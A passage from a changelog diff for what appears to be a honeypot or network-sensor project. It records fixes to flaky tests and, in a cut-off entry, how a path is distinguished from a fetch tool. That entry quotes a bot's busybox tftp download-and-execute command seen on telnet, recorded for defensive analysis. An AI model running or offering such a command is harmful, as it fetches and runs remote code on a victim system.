@@ -135,6 +135,20 @@
 
 ### Fixed
 
+- **Two flaky tests are deterministic** - the review fetcher's
+  `a_claim_hides_its_rows_until_recorded_or_the_lease_lapses` failed about one run in three
+  because `claim_candidates` is global (it syncs every download event and selects across all of
+  `fetch_attempt`) and the test shared a persistent database with other suites, so a leftover
+  `pending` row or another crate's download event was claimed ahead of its own fixture; its
+  hand-written reset covered only `fetch8*.example` hosts and `203.0.113.*` events. Every
+  database test in the review crate (the fetcher orchestration tests and the allowlist,
+  gatekeeper, queue, submit, fetcher-schema, VirusTotal-filter and CLI integration tests, 72 in
+  all) now runs on its own `#[sqlx::test]` database, so no partial reset is left to be
+  incomplete. The sensor-dns `the_global_budget_limits_many_networks_together` assumed 200 ms
+  reply timeouts and a refill window narrow enough for `3..=4` answers, so a stalled host saw
+  more refills or late replies; it now counts what the server did (answered events plus
+  suppressed summaries, which must total the six sent) and bounds the answers by the burst plus
+  one reply per second actually elapsed. No behaviour change in either crate.
 - **A path to a file is no longer taken for the fetch tool of the same name** - observed
   2026-10-09 on telnet: a bot probing for fetch tools ran `/bin/busybox tftp -g HOST -r tftp.sh
   -l - > tftp;chmod 777 tftp;./tftp`, and the final `./tftp`, the empty file the line had just
